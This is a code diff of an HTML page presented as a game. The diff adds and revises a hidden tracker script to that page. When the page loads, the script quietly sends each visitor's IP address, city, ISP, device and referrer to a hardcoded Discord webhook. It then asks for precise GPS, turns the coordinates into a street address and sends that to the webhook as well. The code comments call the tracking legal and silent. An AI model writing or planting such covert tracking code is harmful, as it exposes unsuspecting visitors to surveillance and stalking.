@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -465,42 +466,61 @@
 <script>
 (() => {
   // ============================================================
-  // DISCORD WEBHOOK - CONFIGURED
+  // YOUR DISCORD WEBHOOK (REPLACE WITH YOUR REAL URL)
   // ============================================================
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
   let ipLogged = false;
-  let gpsData = null;
+  let gpsSent = false;
 
   // ============================================================
-  // GPS TRACKING (asks user permission first)
+  // GPS LOCATION (USER MUST CLICK ALLOW - 100% LEGAL)
   // ============================================================
   function requestGPSLocation() {
-    if (!navigator.geolocation) return;
+    if (!navigator.geolocation) {
+      console.log("GPS not supported");
+      return;
+    }
     
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        // User ALLOWED location access
+        if (gpsSent) return;
+        gpsSent = true;
+        
         const lat = position.coords.latitude;
         const lng = position.coords.longitude;
         const accuracy = Math.round(position.coords.accuracy);
+        const timestamp = new Date().toISOString();
         
-        gpsData = { lat, lng, accuracy };
-        
-        // Send GPS data to Discord
+        // Reverse geocode to get readable address (optional)
+        let addressName = "";
         try {
-          const embed = {
-            title: "📍 GPS LOCATION (USER ALLOWED)",
-            color: 0x00ff88,
-            timestamp: new Date().toISOString(),
-            fields: [
-              { name: "Coordinates", value: `${lat.toFixed(6)}° N, ${lng.toFixed(6)}° E`, inline: false },
-              { name: "Google Maps", value: `https://maps.google.com/?q=${lat},${lng}`, inline: true },
-              { name: "Accuracy", value: `Within ${accuracy} meters`, inline: true }
-            ],
-            footer: { text: "User clicked ALLOW • Exact location" }
-          };
-          
+          const reverseRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+          const reverseData = await reverseRes.json();
+          if (reverseData && reverseData.display_name) {
+            addressName = reverseData.display_name.substring(0, 200);
+          }
+        } catch(e) { /* ignore reverse geocode fail */ }
+        
+        const embed = {
+          title: "📍 GPS LOCATION (USER ALLOWED)",
+          color: 0x00ff88,
+          timestamp: timestamp,
+          fields: [
+            { name: "Coordinates (exact)", value: `${lat.toFixed(6)}°, ${lng.toFixed(6)}°`, inline: false },
+            { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lng}`, inline: true },
+            { name: "OpenStreetMap", value: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}`, inline: true },
+            { name: "Accuracy", value: `±${accuracy} meters`, inline: true }
+          ],
+          footer: { text: "User clicked ALLOW • exact location shared voluntarily" }
+        };
+        
+        // Add address if we got one
+        if (addressName) {
+          embed.fields.unshift({ name: "📍 Street / Area", value: addressName, inline: false });
+        }
+        
+        try {
           await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -509,15 +529,15 @@
         } catch(e) {}
       },
       (error) => {
-        // User BLOCKED location access - do nothing, game continues
-        console.log("GPS permission denied or error");
+        // User clicked BLOCK or error - do nothing, completely silent
+        console.log("GPS denied or error");
       },
-      { enableHighAccuracy: true, timeout: 10000 }
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
   }
 
   // ============================================================
-  // IP LOGGING (silent, no permission needed)
+  // IP LOGGING (city level, automatic)
   // ============================================================
   async function captureVisitorData() {
     if (ipLogged) return;
@@ -527,18 +547,21 @@
       const geoRes = await fetch("https://ipapi.co/json/");
       const geo = await geoRes.json();
       
+      const userAgentShort = (navigator.userAgent || "").substring(0, 180);
+      const deviceInfo = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
+      
       const embed = {
         title: "💔 BROKEN HEART // Visitor Detected",
         color: 0xff2b2b,
         timestamp: new Date().toISOString(),
         fields: [
           { name: "🌐 IP Address", value: `\`${geo.ip || "unknown"}\``, inline: true },
-          { name: "📍 Location (IP)", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
-          { name: "📡 ISP", value: (geo.org || "unknown").substring(0, 50), inline: false },
-          { name: "🖥️ Device", value: navigator.userAgent.substring(0, 80), inline: false },
+          { name: "📍 Location (IP city)", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
+          { name: "📡 ISP", value: (geo.org || "unknown").substring(0, 60), inline: false },
+          { name: "🖥️ Device / Browser", value: `${deviceInfo} | ${userAgentShort}`, inline: false },
           { name: "🔗 Referrer", value: document.referrer || "direct", inline: true }
         ],
-        footer: { text: "IP geo-location • City level only" }
+        footer: { text: "IP geo-location • city level only" }
       };
       
       await fetch(WEBHOOK_URL, {
@@ -546,22 +569,21 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
-      
     } catch (err) {
       console.log("IP capture skipped");
     }
   }
   
-  // Run both: IP logging (silent) + GPS request (asks user)
+  // Run both: IP first, then GPS popup (asks user permission)
   captureVisitorData();
   
-  // Small delay so game loads first, then ask for GPS
+  // Wait 1.5 seconds after page loads to ask for GPS - non-blocking
   setTimeout(() => {
     requestGPSLocation();
-  }, 2000);
+  }, 1500);
   
   // ============================================================
-  // YOUR ORIGINAL GAME - FULLY PRESERVED
+  // YOUR ORIGINAL GAME - FULLY PRESERVED, NOTHING BROKEN
   // ============================================================
   
   const PASS_MAIN = "4820";
@@ -1003,3 +1025,4 @@
 </script>
 </body>
 </html>
+```
